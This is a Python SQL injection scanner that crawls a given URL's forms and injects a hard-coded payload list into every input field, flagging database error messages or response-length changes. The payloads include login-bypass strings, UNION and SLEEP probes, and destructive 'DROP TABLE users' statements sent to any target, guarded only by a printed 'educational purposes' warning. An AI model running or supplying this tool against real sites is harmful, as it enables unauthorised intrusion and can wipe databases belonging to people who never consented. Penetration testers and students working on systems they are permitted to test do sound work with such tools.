import requests
from bs4 import BeautifulSoup
import sys
from urllib.parse import urljoin
import logging
import time
import concurrent.futures

# Configuring logging
logging.basicConfig(filename='sql_injection_scan.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"

# Common SQL injection payloads
SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "\" OR 1=1 --",
    "' OR '1'='1",
    "\" OR \"1\"=\"1\"",
    "' UNION SELECT NULL --",
    "\" UNION SELECT NULL --",
    "' AND SLEEP(5) --",
    "\" AND SLEEP(5) --",
    "'; DROP TABLE users --",
    "\"; DROP TABLE users --",
    "' OR 1=1 #",
    "\" OR 1=1 #",
]


def get_forms(url):
    try:
        response = s.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except requests.RequestException as e:
        print(f"Error fetching URL {url}: {e}")
        return []

def form_details(form):
    detailsofForm = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        if input_name and input_type not in ["submit", "button", "image"]:
            inputs_value = input_tag.attrs.get("value", "")
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": inputs_value
            })

    
    for textarea in form.find_all("textarea"):
        name = textarea.attrs.get("name")
        if name:
            value = textarea.get_text().strip()
            inputs.append({
                "type": "textarea",
                "name": name,
                "value": value
            })

    
    for select in form.find_all("select"):
        name = select.attrs.get("name")
        if name:
            options = select.find_all("option")
            value = options[0].attrs.get("value", options[0].get_text().strip()) if options else ""
            inputs.append({
                "type": "select",
                "name": name,
                "value": value
            })

    detailsofForm["action"] = action
    detailsofForm["method"] = method
    detailsofForm["inputs"] = inputs
    return detailsofForm

def vulnerable(response, baseline_response=None):
    errors = {
        "you have an error in your sql syntax;",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "sql syntax error",
        "mysql_fetch_array()",
        "mysql_num_rows()",
        "pg_query()",
        "ora-",
        "microsoft ole db provider for sql server",
        "syntax error converting",
        "unclosed quotation mark",
        "incorrect syntax near",
        "invalid sql statement",
        "supplied argument is not a valid mysql result",
        "column count doesn't match",
        "unknown column",
        "division by zero",
        "call to undefined function mysql_",
    }
    content = response.content.decode(errors='ignore').lower()
    for error in errors:
        if error in content:
            return True
    
    
    if baseline_response and abs(len(response.content) - len(baseline_response.content)) > 100:
        return True
    
    return False

def test_form_vulnerability(form, url, payloads):
    details = form_details(form)
    form_url = urljoin(url, details["action"]) if details["action"] else url
    logging.info(f"Testing form at {form_url} with method {details['method']}")
    
    
    baseline_data = {}
    for input_tag in details["inputs"]:
        baseline_data[input_tag["name"]] = input_tag["value"] or "test"
    
    try:
        if details["method"] == "post":
            baseline_res = s.post(form_url, data=baseline_data)
        elif details["method"] == "get":
            baseline_res = s.get(form_url, params=baseline_data)
        else:
            return None
    except requests.RequestException as e:
        logging.error(f"Error getting baseline for {form_url}: {e}")
        return None
    
    vulnerabilities = []
    
    for payload in payloads:
        for input_tag in details["inputs"]:
            if input_tag["type"] in ["hidden", "text", "password", "email", "search", "textarea", "select"]:
                data = baseline_data.copy()
                data[input_tag["name"]] = payload
                
                try:
                    if details["method"] == "post":
                        res = s.post(form_url, data=data)
                    elif details["method"] == "get":
                        res = s.get(form_url, params=data)
                    else:
                        continue
                    
                    if vulnerable(res, baseline_res):
                        vuln = {
                            "url": form_url,
                            "method": details["method"],
                            "input": input_tag["name"],
                            "payload": payload,
                            "indicator": "error_message" if any(err in res.content.decode(errors='ignore').lower() for err in [
                                "you have an error in your sql syntax;",
                                "warning: mysql",
                                "unclosed quotation mark after the character string",
                                "quoted string not properly terminated"
                            ]) else "content_difference"
                        }
                        vulnerabilities.append(vuln)
                        logging.warning(f"Vulnerability found: {vuln}")
                        break 
                except requests.RequestException as e:
                    logging.error(f"Error testing payload '{payload}' on {form_url}: {e}")
                
                time.sleep(1)  
    
    return vulnerabilities if vulnerabilities else None

def scan_sql_injection(url):
    print("WARNING: This tool is for educational purposes only. Only test on systems you own or have explicit permission to test.")
    logging.info(f"Starting SQL injection scan on {url}")
    
    forms = get_forms(url)
    if not forms:
        print("No forms found or error fetching URL.")
        return
    
    print(f"[+] Detected {len(forms)} forms on {url}.")
    
    vulnerabilities_found = []
    
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        future_to_form = {executor.submit(test_form_vulnerability, form, url, SQLI_PAYLOADS): form for form in forms}
        for future in concurrent.futures.as_completed(future_to_form):
            result = future.result()
            if result:
                vulnerabilities_found.extend(result)
    
    if vulnerabilities_found:
        print("\n[!] SQL Injection vulnerabilities detected:")
        for vuln in vulnerabilities_found:
            print(f"  - URL: {vuln['url']}")
            print(f"    Method: {vuln['method']}")
            print(f"    Input: {vuln['input']}")
            print(f"    Payload: {vuln['payload']}")
            print(f"    Indicator: {vuln['indicator']}")
            print()
    else:
        print("\n[+] No SQL injection vulnerabilities detected.")
    
    logging.info(f"Scan completed. Found {len(vulnerabilities_found)} vulnerabilities.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python sql_injection_scanner.py <url>")
        print("WARNING: This tool is for educational purposes only. Only test on systems you own or have explicit permission to test.")
        sys.exit(1)
    urlToBeChecked = sys.argv[1]
    logging.info(f"Scan initiated for URL: {urlToBeChecked}")
    scan_sql_injection(urlToBeChecked)
